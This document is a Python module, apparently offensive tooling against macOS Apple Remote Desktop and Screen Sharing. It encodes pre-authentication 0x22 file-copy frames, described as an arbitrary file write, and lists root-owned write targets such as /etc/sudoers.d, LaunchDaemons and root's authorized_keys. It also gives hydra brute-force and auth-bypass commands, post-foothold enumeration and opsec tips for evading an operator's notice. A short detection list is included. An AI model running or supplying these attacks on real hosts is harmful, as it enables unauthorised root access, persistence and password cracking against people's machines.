"""Operator command generation + ARD file-copy frame encoder.

Everything here is command/byte assembly for testing hosts you control: your
own Macs, a lab VM (UTM/VMware Fusion with a macOS guest), or an engagement
target named in scope. Nothing calls the network by itself.
"""

from __future__ import annotations

import struct

ARD_BIN = "/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart"

# ---------------------------------------------------------------- ARD 0x22 --
# Screensharingd file-copy message (from public screensharingd research):
#   [u8 0x22][u8 sub][be32 L]
#   [be16 ver][be16 kind][be32 sid][be32 arg]
#   [L-12 bytes payload]
MSG_FILE_COPY = 0x22

FILE_SEND = 1         # kind=1 StartFileSend  -> arbitrary file read
FILE_RECEIVE = 2      # kind=2 StartFileReceive -> arbitrary file write
KIND_START = 1        # NewItem sub-kind 101
KIND_NEW_ITEM = 101

PAYLOAD_OFFSET_PATH = 0
PAYLOAD_OFFSET_FILESIZE = 42
PAYLOAD_OFFSET_MODE = 0x5A


def file_copy_frame(kind: int, sid: int, arg: int, payload: bytes,
                    version: int = 1) -> bytes:
    """Encode one documented 0x22 frame.

    L counts the 12-byte tail header plus the payload (the payload is L-12
    bytes), so the whole frame on the wire is 6 + L bytes.
    """
    body = struct.pack(">HHII", version, kind, sid, arg) + payload
    length = len(body)
    return struct.pack(">BBI", MSG_FILE_COPY, 0, length) + body


def new_item_payload(path: str, size: int, unix_mode: int = 0o600,
                      is_file: bool = True, pad: int = 0x60,
                      path_off: int = 0x60) -> bytes:
    """Build the NewItem (kind=101) payload the writer path expects.

    Fields the public research pins down:
      byte 14 / arg[0] = 0x01 -> regular file
      +42  big-endian file size (must be non-zero)
      +0x5a unix mode (0600 for anything root will auto-consume)
    The name region itself is implementation-defined; it is written past the
    documented fields (path_off) so it can never clobber them.
    """
    path_bytes = path.encode("utf-8") + b"\x00"
    need = path_off + len(path_bytes)
    blob = bytearray(max(pad, need, 0x5C + 2))
    blob[14] = 0x01 if is_file else 0x00
    blob[PAYLOAD_OFFSET_FILESIZE:PAYLOAD_OFFSET_FILESIZE + 4] = struct.pack(">I", size)
    blob[PAYLOAD_OFFSET_MODE:PAYLOAD_OFFSET_MODE + 2] = struct.pack(">H", unix_mode)
    blob[path_off:path_off + len(path_bytes)] = path_bytes
    return bytes(blob)


def build_writer_stream(path: str, content: bytes, unix_mode: int = 0o600,
                         sid: int = 1) -> bytes:
    """NewItem + StartFileReceive frames for one file write transaction."""
    payload = new_item_payload(path, len(content), unix_mode)
    frames = file_copy_frame(KIND_NEW_ITEM, sid, 0x01, payload)
    frames += file_copy_frame(FILE_RECEIVE, sid, len(content), content)
    return frames


# ------------------------------------------------------- privileged targets --
PRIV_WRITE_TARGETS = [
    ("/etc/sudoers.d/", "root-consumed sudo policy; SIP does not block /etc/sudoers.d writes"),
    ("/etc/zshenv", "sourced by every zsh invocation, including root shells"),
    ("/Library/LaunchDaemons/", "root LaunchDaemon plist, loaded at boot"),
    ("/var/root/.ssh/authorized_keys", "root SSH key -> root login over Remote Login"),
]


def ard_kickstart(enable: bool = True) -> list[str]:
    """kickstart invocations for ARD administration on a host you control."""
    if enable:
        return [
            f"sudo {ARD_BIN} -activate -configure -allowAccessFor -allUsers "
            f"-privs -all -clientopts -setmenuextra -menuextra yes",
        ]
    return [
        f"sudo {ARD_BIN} -deactivate -configure -access -off",
        f"sudo {ARD_BIN} -configure -clientopts -setmenuextra -menuextra no",
    ]


def truncate_wordlist(lines: list[str], width: int = 8) -> list[str]:
    """ARD/VNC auth compares only the first 8 password characters.

    Dedupe candidates by their 8-char prefix so the same auth test is spent
    once instead of N times.
    """
    seen: dict[str, str] = {}
    for line in lines:
        pw = line.rstrip("\r\n")
        if not pw:
            continue
        key = pw[:width]
        seen.setdefault(key, pw)
    return list(seen.values())


def plan_for(host: str, rfb_json: dict | None = None) -> dict:
    """Full command set for one macOS host."""
    rfb_json = rfb_json or {}
    types = rfb_json.get("security_types") or []
    version = rfb_json.get("version", "")

    discovery = [
        f"nmap -sU -p 5353 --script=dns-service-discovery {host}",
        f"nmap -Pn -p 22,88,445,548,3031,3283,4488,5900,7000 -sV {host}",
        f"dns-sd -B _rfb._tcp local   # from a Mac on the same segment",
        f"dns-sd -L \"<Instance>\" _rfb._tcp local   # resolve instance -> host:port",
    ]

    screen_sharing = [
        f"nmap -Pn -p 5900 --script=vnc-info {host}",
        f"nmap -Pn -p 5900 --script=realvnc-auth-bypass {host}",
    ]
    if 2 in types or not types:
        screen_sharing += [
            f"# ARD/VNC auth compares first 8 chars only; no default rate limit",
            f"hydra -s 5900 -t 1 -f -l <user> -P pw-trunc8.txt {host} vnc://{host}",
            f"GoRedShell -t {host} -p 5900 -u <user> -w pw-trunc8.txt",
        ]
    if 36 in types:
        screen_sharing.append(
            "# type 36 = Apple SRP + ChaCha20-Poly1305; password path is SRP proof, "
            "not DES. Detect: SRP frame length >= 32768 in the first SRP read")
    if rfb_json.get("apple_screensharing"):
        screen_sharing.append(
            f"# {version} Apple Screen Sharing: pre-auth file-copy path via message 0x22 "
            f"on affected builds; write targets -> {', '.join(t for t, _ in PRIV_WRITE_TARGETS)}")

    rae = [
        f"nmap -Pn -p 3031 {host}",
        f"osascript -e 'tell application \"Finder\" of machine \"eppc://user:pass@{host}\" "
        f"to get name of startup disk'   # run from a Mac, valid creds required",
    ]

    post = [
        f"# local enumeration once you have a shell:",
        f"system_profiler SPSharingDataType",
        f"sudo /usr/sbin/systemsetup -getremotelogin",
        f"sudo /usr/sbin/systemsetup -getremoteappleevents",
        f"sudo {ARD_BIN} -status",
        f"sudo launchctl print-disabled system | egrep 'com.apple.screensharing|com.apple.AEServer|ssh'",
        f"lsof -nP -iTCP:5900 -iTCP:3031 -iTCP:3283 -sTCP:LISTEN",
        f"netstat -rn | grep 169   # link-local bootp route = Bonjour active",
    ]

    detect = [
        f"# blue-team telemetry for this host:",
        f"# - security type 36 session whose first SRP frame length >= 32768",
        f"# - cleartext 0x22 file-copy traffic before any successful SRP proof / cipher install",
        f"# - repeated short-lived TCP/5900 retries + several file-copy sid values in one burst",
        f"# - new /etc/zshenv, /etc/sudoers.d/*, /Library/LaunchDaemons/*.plist, "
        f"/var/root/.ssh/authorized_keys after Screen Sharing exposure",
    ]

    return {
        "host": host,
        "rfb_version": version,
        "security_types": types,
        "discovery": discovery,
        "screen_sharing": screen_sharing,
        "remote_apple_events": rae,
        "post_foothold": post,
        "detection": detect,
        "opsec": [
            "mDNS discovery is passive: read-only UDP, no host-visible login events",
            "TCP connect probes hit the kernel and may land in unified log via pf; keep the port set tight",
            "RFB auth attempts are logged per connection - rate shape is the tell, not volume",
            "Never let a brute-force run touch 5900 while an operator is watching the console",
        ],
    }
